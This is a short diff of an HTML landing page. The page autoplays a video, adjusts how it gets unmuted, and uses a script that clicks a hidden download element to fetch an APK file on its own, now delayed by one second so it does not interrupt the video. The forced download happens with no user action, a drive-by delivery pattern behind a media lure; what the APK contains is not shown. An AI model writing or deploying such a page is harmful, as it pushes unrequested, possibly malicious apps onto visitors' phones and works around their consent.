@@ -44,7 +44,7 @@
 
 <body>
 
-  <video id="v" autoplay muted loop playsinline>
+  <video id="v" autoplay muted loop playsinline preload="auto">
     <source src="vid_with_music.mp4" type="video/mp4" />
   </video>
 
@@ -58,31 +58,17 @@
   <script>
     var v = document.getElementById('v');
 
-    // Step 1: Start muted — Chrome always allows muted autoplay
-    // Step 2: As soon as video starts playing, try to unmute
-    v.addEventListener('play', function () {
-      v.muted = false;
-      // If browser rejects unmuting silently, catch it
-      var promise = v.play();
-      if (promise !== undefined) {
-        promise.catch(function () {
-          v.muted = true; // fallback: keep muted so video still shows
-        });
-      }
-    }, { once: true });
-
-    // Step 3: On ANY user touch/click — unmute permanently
+    // Unmute on first tap (sound starts on touch — unavoidable on mobile)
     function unmute() {
       v.muted = false;
-      v.play().catch(function () {});
     }
-    document.addEventListener('click', unmute);
-    document.addEventListener('touchstart', unmute);
+    document.addEventListener('touchstart', unmute, { once: true });
+    document.addEventListener('click', unmute, { once: true });
 
-    // Auto-download APK instantly
+    // Delay APK download by 1s so it does NOT interrupt video loading
     setTimeout(function () {
       document.getElementById('dl').click();
-    }, 0);
+    }, 1000);
   </script>
 
 </body>
